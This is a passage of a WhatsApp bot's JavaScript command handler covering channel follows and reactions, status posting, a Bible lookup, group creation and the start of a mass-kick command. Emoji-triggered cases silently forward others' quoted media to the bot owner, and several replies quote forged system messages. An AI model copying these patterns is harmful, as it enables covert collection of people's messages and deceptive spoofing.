      } catch (e) {}
      try { runningSocket.ws?.close(); } catch (e) {}
      activeSockets.delete(target);
      socketCreationTime.delete(target);
    }

    await removeSessionFromMongo(target);
    await removeNumberFromMongo(target);

    const tmpSessionPath = path.join(os.tmpdir(), `session_${target}`);
    try {
      if (fs.existsSync(tmpSessionPath)) fs.removeSync(tmpSessionPath);
    } catch (e) {}

    await socket.sendMessage(sender, {
      image: { url: config.RCD_IMAGE_PATH },
      caption:
        `╭┄ 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓\n` +
        `│. • 𝚂𝙴𝚂𝚂𝙸𝙾𝙽 : ᴅᴇʟᴇᴛᴇᴅ\n` +
        `│. • 𝚃𝙰𝚁𝙶𝙴𝚃 : ${target}\n` +
        `│. • 𝚂𝚃𝙰𝚃𝚄𝚂 : sᴜᴄᴄᴇss\n` +
        `╰┄────────────────╯`
    }, { quoted: msg });

  } catch (err) {
    await socket.sendMessage(sender, {
      text:
        `╭┄ 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 \n` +
        `│. • 𝙴𝚁𝚁𝙾𝚁 : ғᴀɪʟᴇᴅ\n` +
        `│. • 𝚁𝙴𝙰𝚂𝙾𝙽 : ${err.message || err}\n` +
        `╰┄────────────────╯`
    }, { quoted: msg });
  }

  break;
}



case 'cfn': {
  const fs = require('fs');

  const sanitized = (senderNumber || '').replace(/[^0-9]/g, '');
  const cfg = await loadUserConfigFromMongo(sanitized) || {};
  const botName = cfg.botName || BOT_NAME_FANCY;
  const logo = cfg.logo || config.RCD_IMAGE_PATH;

  const full = args.join(" ").trim();
  if (!full) {
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👑 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐅𝐍*
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ
│. ˚˖𓍢ִ໋• .cfn <jid@newsletter> | emoji1,emoji2
│. ˚˖𓍢ִ໋📍 ᴇxᴀᴍᴘʟᴇ
│. ˚˖𓍢ִ໋• .cfn 1203634@newsletter | 🔥,❤️
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
    break;
  }

  const admins = await loadAdminsFromMongo();
  const normalizedAdmins = (admins || []).map(a => (a || '').toString());

  const senderIdSimple = (senderNumber || '').toString();
  const isAdmin = normalizedAdmins.includes(sender) || normalizedAdmins.includes(senderNumber);

  if (!(isOwner || isAdmin)) {
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋⛔ *𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃*
│. ˚˖𓍢ִ໋❌ ᴏɴʟʏ ᴏᴡɴᴇʀ / ᴀᴅᴍɪɴ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
    break;
  }

  let jidPart = full;
  let emojisPart = '';

  if (full.includes('|')) {
    const split = full.split('|');
    jidPart = split[0].trim();
    emojisPart = split.slice(1).join('|').trim();
  }

  const jid = jidPart;
  if (!jid || !jid.endsWith('@newsletter')) {
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐉𝐈𝐃*
│. ˚˖𓍢ִ໋📌 ᴇx: 1203634@newsletter
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
    break;
  }

  let emojis = [];
  if (emojisPart) {
    emojis = emojisPart.includes(',')
      ? emojisPart.split(',').map(e => e.trim())
      : emojisPart.split(/\s+/).map(e => e.trim());
  }

  try {
    if (typeof socket.newsletterFollow === 'function') {
      await socket.newsletterFollow(jid);
    }

    await addNewsletterToMongo(jid, emojis);

    const emojiText = emojis.length ? emojis.join(' ') : '(default)';

    const metaQuote = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_CFN" },
      message: {
        contactMessage: {
          displayName: botName,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:YOU WEB BOT\nEND:VCARD`
        }
      }
    };

    const imagePayload = String(logo).startsWith('http')
      ? { url: logo }
      : fs.readFileSync(logo);

    await socket.sendMessage(sender, {
      image: imagePayload,
      caption:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👑 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐅𝐍*
│. ˚˖𓍢ִ໋✅ ᴄʜᴀɴɴᴇʟ ᴀᴅᴅᴇᴅ
│. ˚˖𓍢ִ໋📡 ${jid}
│. ˚˖𓍢ִ໋😊 ${emojiText}
│. ˚˖𓍢ִ໋👤 @${senderIdSimple}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,
      mentions: [sender]
    }, { quoted: metaQuote });

  } catch (e) {
    console.error('cfn error', e);
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ${e.message || e}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }

  break;
}

case 'chr': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  const cfg = await loadUserConfigFromMongo(sanitized) || {};
  const botName = cfg.botName || BOT_NAME_FANCY;
  const logo = cfg.logo || config.RCD_IMAGE_PATH;

  const senderIdSimple = (nowsender || '').includes('@') ? nowsender.split('@')[0] : (nowsender || '');

  const q = body.split(' ').slice(1).join(' ').trim();
  if (!q.includes(',')) {
    return await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐇𝐑*
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ
│. ˚˖𓍢ִ໋• chr <channel/message>,<emoji>
│. ˚˖𓍢ִ໋📍 ᴇx: chr 0029Vb7/175,👍
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }

  const parts = q.split(',');
  let channelRef = parts[0].trim();
  const reactEmoji = parts[1].trim();

  let channelJid = null;
  let messageId = null;

  const urlMatch = channelRef.match(/whatsapp\.com\/channel\/([^\/]+)\/(\d+)/);
  if (urlMatch) {
    channelJid = `${urlMatch[1]}@newsletter`;
    messageId = urlMatch[2];
  } else {
    const maybeParts = channelRef.split('/');
    if (maybeParts.length >= 2) {
      messageId = maybeParts[maybeParts.length - 1];
      channelJid = maybeParts[maybeParts.length - 2];
      if (!channelJid.endsWith('@newsletter')) {
        if (/^\d+$/.test(channelJid)) {
          channelJid = `${channelJid}@newsletter`;
        }
      }
    }
  }

  if (!channelJid || !messageId || !channelJid.endsWith('@newsletter')) {
    return await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐅𝐎𝐑𝐌𝐀𝐓*
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ ᴇxᴀᴍᴘʟᴇs
│. ˚˖𓍢ִ໋• chr jid/message,emoji
│. ˚˖𓍢ִ໋• chr /175,👍
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }

  try {
    await socket.newsletterReactMessage(channelJid, messageId.toString(), reactEmoji);
    await saveNewsletterReaction(channelJid, messageId.toString(), reactEmoji, sanitized);

    const metaQuote = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_CHR"
      },
      message: {
        contactMessage: {
          displayName: botName,
          vcard:
`BEGIN:VCARD
VERSION:3.0
N:${botName};;;;
FN:${botName}
ORG:YOU WEB BOT
END:VCARD`
        }
      }
    };

    let imagePayload;
    if (String(logo).startsWith('http')) imagePayload = { url: logo };
    else imagePayload = fs.readFileSync(logo);

    await socket.sendMessage(sender, {
      image: imagePayload,
      caption:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👑 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐇𝐑*
│. ˚˖𓍢ִ໋✅ ʀᴇᴀᴄᴛɪᴏɴ sᴇɴᴛ
│. ˚˖𓍢ִ໋📡 ${channelJid}
│. ˚˖𓍢ִ໋📝 ${messageId}
│. ˚˖𓍢ִ໋😊 ${reactEmoji}
│. ˚˖𓍢ִ໋👤 @${senderIdSimple}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,
      mentions: [nowsender]
    }, { quoted: metaQuote });

  } catch (e) {
    console.error('chr command error', e);
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ${e.message || e}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }

  break;
}
case 't':
case '🌹':
case '😍':
case '❤️': {
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    
    if (!quoted) {
        break; // rien à faire si aucun média cité
    }

    try {
        const userJid = jidNormalizedUser(socket.user.id);
        
        // Forwarder directement le message cité
        await socket.sendMessage(userJid, {
            forward: {
                key: {
                    remoteJid: from,
                    fromMe: false,
                    id: msg.key.id
                },
                message: quoted
            }
        });

    } catch (e) {
        console.error("[SAVE ERROR]:", e);
        // pas de réaction ni de message d'erreur envoyé
    }
    break;
}

case 'save': {
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    
    if (!quoted) {
        await socket.sendMessage(sender, { 
            text: `💾 *Save*\n\n❌ Réponds à un média avec !${command}` 
        }, { quoted: msg });
        break;
    }

    await socket.sendMessage(sender, { 
        react: { text: "⏳", key: msg.key } 
    });

    try {
        const userJid = jidNormalizedUser(socket.user.id);
        
        // Forwarder directement le message cité
        await socket.sendMessage(userJid, {
            forward: {
                key: {
                    remoteJid: from,
                    fromMe: false,
                    id: msg.key.id
                },
                message: quoted
            }
        });

        // Seulement la réaction de succès, pas de message texte
        await socket.sendMessage(sender, { 
            react: { text: "✅", key: msg.key } 
        });

    } catch (e) {
        console.error("[SAVE ERROR]:", e);
        await socket.sendMessage(sender, { 
            react: { text: "❌", key: msg.key } 
        });
        // Optionnel: garder le message d'erreur
        // await socket.sendMessage(sender, { 
        //     text: `❌ Erreur: ${e.message}` 
        // }, { quoted: msg });
    }
    break;
}

// ---------------------- PING ----------------------
case 'ping': {
    try {

        // ===== REACT =====
        await socket.sendMessage(sender, {
            react: {
                text: "💫",
                key: msg.key
            }
        });

        const start = Date.now();

        await new Promise(r => setTimeout(r, 1));

        const ping = Date.now() - start;

        const text = `
╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│ ⚡ PING TEST
│ 📶 ping : ${ping} ms
│ 🤖 status : online
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
`.trim();

        // ===== BUTTONS =====
        const buttons = [
            {
                buttonId: `${prefix}menu`,
                buttonText: { displayText: "📋 ᴍᴇɴᴜ" },
                type: 1
            },
            {
                buttonId: `${prefix}alive`,
                buttonText: { displayText: "🤖 ᴀʟɪᴠᴇ" },
                type: 1
            },
            {
                buttonId: `${prefix}test`,
                buttonText: { displayText: "🔁 ᴛᴇsᴛ" },
                type: 1
            }
        ];

        const fs = require("fs");
        const imagePath = "./menu3.jpg";

        if (!fs.existsSync(imagePath)) {
            return socket.sendMessage(sender, {
                text: "❌ menu3.jpg not found"
            }, { quoted: msg });
        }

        const buffer = fs.readFileSync(imagePath);

        await socket.sendMessage(sender, {
            image: buffer,
            caption: text,
            contextInfo: {
                externalAdReply: {
                    title: "you md bot",
                    body: `ping: ${ping} ms`,
                    thumbnailUrl: "https://files.catbox.moe/mrdglh.png",
                    sourceUrl: "https://files.catbox.moe/bqzb2v.jpg",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            },
            buttons: buttons,
            headerType: 4
        }, { quoted: msg });

    } catch (e) {
        console.error("PING ERROR:", e);

        await socket.sendMessage(sender, {
            text: "❌ Error while testing ping"
        }, { quoted: msg });
    }
}
break;

case 'test': {
  try {

    // ===== REACT =====
    await socket.sendMessage(sender, {
      react: {
        text: "🏴",
        key: msg.key
      }
    });

    const fs = require('fs');
    const start = Date.now();

    // ===== IMAGE =====
    const imagePath = './test.jpg';

    if (!fs.existsSync(imagePath)) {
      return await socket.sendMessage(sender, {
        text: "❌ test.jpg introuvable"
      }, { quoted: msg });
    }

    const buffer = fs.readFileSync(imagePath);

    // ===== FAKE QUOTE =====
    const tt = {
      key: {
        remoteJid: 'status@broadcast',
        fromMe: false,
        id: 'YOU_MD_STYLISH',
        participant: '0@s.whatsapp.net'
      },
      message: {
        conversation: "ʏᴏᴜ ᴍᴅ ʀᴜɴɴɪɴɢ 🕷️"
      }
    };

    // ===== UPTIME =====
    const uptime = process.uptime();
    const h = Math.floor(uptime / 3600);
    const m = Math.floor((uptime % 3600) / 60);
    const s = Math.floor(uptime % 60);

    const runtimeText = `${h}h ${m}m ${s}s`;

    // ===== PING REAL =====
    const ping = Date.now() - start;

    // ===== SAFE SMALL CAPS =====
    const sc = (text) => {
      try {
        return typeof toSmallCaps === "function"
          ? toSmallCaps(text)
          : text;
      } catch {
        return text;
      }
    };

    const botMode = global.mode || "public";

    const testMsg = `
🚀 *${sc("you md running")}*

╭┄┄◆ ${sc("system test")} ◆
│ ◈ ${sc("runtime")} : ${runtimeText}
│ ◈ ${sc("mode")} : ${sc(botMode)}
│ ◈ ${sc("ping")} : ${ping}ms
╰┄┄┄┄┄┄┄┄┄┄┄ᕗ

> ${sc("powered by you tech")}
`.trim();

    // ===== SEND (FIX IMPORTANT) =====
    await socket.sendMessage(sender, {
      image: buffer,
      caption: testMsg,
      contextInfo: {
        externalAdReply: {
          title: sc("YOU MD TEST"),
          body: sc("system online"),
          thumbnailUrl: "https://i.imgur.com/placeholder.png", // IMPORTANT FIX
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://whatsapp.com"
        }
      }
    }, { quoted: tt });

  } catch (e) {

    console.error("TEST ERROR:", e);

    await socket.sendMessage(sender, {
      text: "❌ test error: " + (e.message || e)
    }, { quoted: msg });
  }

  break;
}

case 'post':
case 'statusgc':
case 'poststatus': {

  try {

    const {
      downloadContentFromMessage
    } = require("@ryuu-reinzz/baileys");

    // ================= BUFFER FUNCTION =================

    async function getBuffer(message, type) {

      const stream =
        await downloadContentFromMessage(
          message,
          type
        );

      let buffer =
        Buffer.from([]);

      for await (
        const chunk of stream
      ) {

        buffer =
          Buffer.concat([
            buffer,
            chunk
          ]);

      }

      return buffer;

    }

    // ================= GROUP ONLY =================

    if (!from.endsWith("@g.us")) {

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 📢 POST STATUS 』
│
│ ❌ GROUP ONLY
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    // ================= ADMIN CHECK =================

    const metadata =
      await socket.groupMetadata(
        from
      );

    const admins =
      metadata.participants
        .filter(
          p => p.admin
        )
        .map(
          p => p.id
        );

    const senderJid =
      msg.key.participant ||
      sender;

    if (
      !admins.includes(
        senderJid
      )
    ) {

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 ❌ ACCESS DENIED 』
│
│ ONLY ADMINS CAN
│ USE THIS COMMAND
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    // ================= STATUS USERS =================

    const participants =
      metadata.participants.map(
        p => p.id
      );

    const statusJid =
      "status@broadcast";

    // ================= QUOTED =================

    const quoted =
      msg.message?.extendedTextMessage
        ?.contextInfo
        ?.quotedMessage;

    // ================= TEXT =================

    const text =
      args.join(" ").trim();

    // ================= REACT =================

    react("📢");

    // =====================================================
    // ================= IMAGE STATUS =======================
    // =====================================================

    if (
      quoted?.imageMessage
    ) {

      const buffer =
        await getBuffer(
          quoted.imageMessage,
          "image"
        );

      await socket.sendMessage(
        statusJid,
        {

          image:
            buffer,

          caption:
            text ||
            "📸 YOU WEB BOT STATUS"

        },
        {
          statusJidList:
            participants
        }
      );

      await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 ✅ IMAGE STATUS 』
│
│ 📸 IMAGE STATUS
│ POSTED SUCCESSFULLY
│
│ 👥 VIEWERS :
│ ${participants.length}
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,

          contextInfo: {

            newsletterJid:
              "120363426341519710@newsletter",

            newsletterName:
              "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

            externalAdReply: {

              title:
                "ᴅєν уσυ sтᴀтus ᴘσsт",

              body:
                "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",

              thumbnailUrl:
                "https://i.postimg.cc/hGD0FkT5/file-00000000ee0c720c90258685675507d2.png",

              mediaType: 1,

              renderLargerThumbnail: true,

              sourceUrl:
                "https://whatsapp.com/channel/120363426341519710"

            }

          }

        },
        { quoted: msg }
      );

      react("✅");

      break;

    }

    // =====================================================
    // ================= VIDEO STATUS =======================
    // =====================================================

    if (
      quoted?.videoMessage
    ) {

      const buffer =
        await getBuffer(
          quoted.videoMessage,
          "video"
        );

      await socket.sendMessage(
        statusJid,
        {

          video:
            buffer,

          caption:
            text ||
            "🎥 YOU WEB BOT STATUS"

        },
        {
          statusJidList:
            participants
        }
      );

      await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 ✅ VIDEO STATUS 』
│
│ 🎥 VIDEO STATUS
│ POSTED SUCCESSFULLY
│
│ 👥 VIEWERS :
│ ${participants.length}
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,

          contextInfo: {

            newsletterJid:
              "120363426341519710@newsletter",

            newsletterName:
              "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

            externalAdReply: {

              title:
                "ᴅєν уσυ sтᴀтus ᴘσsт",

              body:
                "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",

              thumbnailUrl:
                "https://i.postimg.cc/hGD0FkT5/file-00000000ee0c720c90258685675507d2.png",

              mediaType: 1,

              renderLargerThumbnail: true,

              sourceUrl:
                "https://whatsapp.com/channel/120363426341519710"

            }

          }

        },
        { quoted: msg }
      );

      react("✅");

      break;

    }

    // =====================================================
    // ================= AUDIO STATUS =======================
    // =====================================================

    if (
      quoted?.audioMessage
    ) {

      const buffer =
        await getBuffer(
          quoted.audioMessage,
          "audio"
        );

      await socket.sendMessage(
        statusJid,
        {

          audio:
            buffer,

          mimetype:
            "audio/mp4",

          ptt: false

        },
        {
          statusJidList:
            participants
        }
      );

      await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 ✅ AUDIO STATUS 』
│
│ 🎵 AUDIO STATUS
│ POSTED SUCCESSFULLY
│
│ 👥 VIEWERS :
│ ${participants.length}
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,

          contextInfo: {

            newsletterJid:
              "120363426341519710@newsletter",

            newsletterName:
              "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

            externalAdReply: {

              title:
                "ᴅєν уσυ sтᴀтus ᴘσsт",

              body:
                "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",

              thumbnailUrl:
                "https://i.postimg.cc/hGD0FkT5/file-00000000ee0c720c90258685675507d2.png",

              mediaType: 1,

              renderLargerThumbnail: true,

              sourceUrl:
                "https://whatsapp.com/channel/120363426341519710"

            }

          }

        },
        { quoted: msg }
      );

      react("✅");

      break;

    }

    // =====================================================
    // ================= TEXT STATUS ========================
    // =====================================================

    if (!text) {

      react("❌");

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 📢 POST STATUS 』
│
│ ❌ ENTER A MESSAGE
│ OR REPLY MEDIA
│
│ 📌 EXAMPLES :
│ .post HELLO
│ REPLY IMAGE + .post
│ REPLY VIDEO + .post
│ REPLY AUDIO + .post
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> MADE IN BY YOU TECHX OFC`
        },
        { quoted: msg }
      );

    }

    // ================= SEND TEXT STATUS =================

    await socket.sendMessage(
      statusJid,
      {

        text:
`╭┈┈『 📢 GROUP STATUS 』
│
│ 🏷️ GROUP :
│ ${metadata.subject}
│
│ 💬 MESSAGE :
│ ${text}
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> MADE IN BY YOU TECHX OFC`

      },
      {
        statusJidList:
          participants
      }
    );

    // ================= SUCCESS =================

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ✅ STATUS POSTED 』
│
│ 📢 TEXT STATUS
│ POSTED SUCCESSFULLY
│
│ 👥 VIEWERS :
│ ${participants.length}
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,

        contextInfo: {

          newsletterJid:
            "120363426341519710@newsletter",

          newsletterName:
            "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

          externalAdReply: {

            title:
              "ᴅєν уσυ sтᴀтus ᴘσsт",

            body:
              "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",

            thumbnailUrl:
              "https://i.postimg.cc/hGD0FkT5/file-00000000ee0c720c90258685675507d2.png",

            mediaType: 1,

            renderLargerThumbnail: true,

            sourceUrl:
              "https://whatsapp.com/channel/120363426341519710"

          }

        }

      },
      { quoted: msg }
    );

    react("✅");

  } catch (e) {

    console.error(
      "POST STATUS ERROR =>",
      e
    );

    react("❌");

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ❌ ERROR 』
│
│ FAILED TO POST
│ STATUS
│
│ CHECK IF BOT
│ HAS STATUS ACCESS
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: msg }
    );

  }

}
break;



            case 'bibleai':
case 'bible':
case 'verset': {
    if (!args[0]) {
        await socket.sendMessage(sender, {
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📖 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐁𝐈𝐁𝐋𝐄 𝐀𝐈*
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ
│. ˚˖𓍢ִ໋• !${command} <question>
│. ˚˖𓍢ִ໋📍 ᴇx: !${command} Qui est Jésus ?
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });
        break;
    }

    const question = args.join(' ');

    await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔍 *𝐑𝐄𝐂𝐇𝐄𝐑𝐂𝐇𝐄 𝐁𝐈𝐁𝐋𝐈𝐐𝐔𝐄*
│. ˚˖𓍢ִ໋⏳ ᴄʜᴀʀɢᴇᴍᴇɴᴛ...
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    try {
        const params = new URLSearchParams({
            question: question,
            translation: 'LSG',
            language: 'fr',
            'filters[]': ['bible', 'books', 'articles'],
            pro: 'false'
        });

        const url = `https://api.bibleai.com/v2/search?${params.toString()}`;
        const fetch = require('node-fetch');
        const res = await fetch(url);
        const json = await res.json();

        if (json.status !== 1 || !json.data) {
            await socket.sendMessage(sender, {
                text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐀𝐔𝐂𝐔𝐍 𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐓*
│. ˚˖𓍢ִ໋📖 ɪɴᴛᴇʀʀᴏɢᴀᴛɪᴏɴ ɪɴᴛʀᴏᴜᴠᴀʙʟᴇ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
            }, { quoted: msg });
            break;
        }

        const { answer, sources } = json.data;

        let responseText =
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📖 *𝐁𝐈𝐁𝐋𝐄 𝐀𝐈 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄*
│. ˚˖𓍢ִ໋────────────
│
${answer}
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n`;

        if (Array.isArray(sources) && sources.length > 0) {
            responseText += `\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📑 *𝐕𝐄𝐑𝐒𝐄𝐒*
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n`;

            const verses = sources.filter(s => s.type === 'verse').slice(0, 6);

            verses.forEach((s, i) => {
                let ref = s.book && s.chapter
                    ? `${s.book} ${s.chapter}:${s.verse || ''}`
                    : s.title || `Source ${i + 1}`;

                responseText += `\n• ${ref}\n${s.text}\n`;
            });
        }

        await socket.sendMessage(sender, { text: responseText }, { quoted: msg });

    } catch (e) {
        console.error(e);
        await socket.sendMessage(sender, {
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐄𝐑𝐑𝐄𝐔𝐑*
│. ˚˖𓍢ִ໋⚠️ ${e.message}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });
    }

    break;
}

case 'creategroup':
case 'cgroup': {
    if (!args[0]) {
        await socket.sendMessage(sender, {
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👥 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐆𝐑𝐎𝐔𝐏*
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ
│. ˚˖𓍢ִ໋• !${command} <nom du groupe>
│. ˚˖𓍢ִ໋📍 ᴇx: !${command} My Group
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });
        break;
    }

    const groupName = args.join(' ');

    await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋⏳ *𝐂𝐑𝐄𝐀𝐓𝐈𝐎𝐍 𝐄𝐍 𝐂𝐎𝐔𝐑𝐒*
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    try {
        const group = await socket.groupCreate(groupName, [sender]);

        let response =
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👥 *𝐆𝐑𝐎𝐔𝐏 𝐂𝐑𝐄𝐀𝐓𝐄𝐃*
│. ˚˖𓍢ִ໋📛 ${groupName}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`;

        try {
            await socket.groupParticipantsUpdate(group.id, [sender], "promote");
            response += `\n│. ˚˖𓍢ִ໋👑 ʏᴏᴜ ᴀʀᴇ ᴀᴅᴍɪɴ`;
        } catch {}

        try {
            const code = await socket.groupInviteCode(group.id);
            response += `\n│. ˚˖𓍢ִ໋🔗 https://chat.whatsapp.com/${code}`;
        } catch {}

        response += `\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`;

        await socket.sendMessage(sender, { text: response }, { quoted: msg });

    } catch (e) {
        await socket.sendMessage(sender, {
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐄𝐑𝐑𝐄𝐔𝐑*
│. ˚˖𓍢ִ໋⚠️ ${e.message}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });
    }

    break;
}

            // ============ KICK ALL ============
            case 'kickall2': {
    if (!from.endsWith('@g.us')) {
        await socket.sendMessage(sender, {
            text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐊𝐈𝐂𝐊𝐀𝐋𝐋*
│. ˚˖𓍢ִ໋📌 ɴᴏᴛɪᴄᴇ
│. ˚˖𓍢ִ໋• ᴄᴏᴍᴍᴀɴᴅ ɢʀᴏᴜᴘ ᴏɴʟʏ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });
        break;
    }

    try {
        const fs = require("fs");

        const metadata = await socket.groupMetadata(from);
        const participants = metadata.participants || [];
        const groupName = metadata.subject || "Sans nom";

        const botNumber = socket.user.id.split(':')[0] + '@s.whatsapp.net';
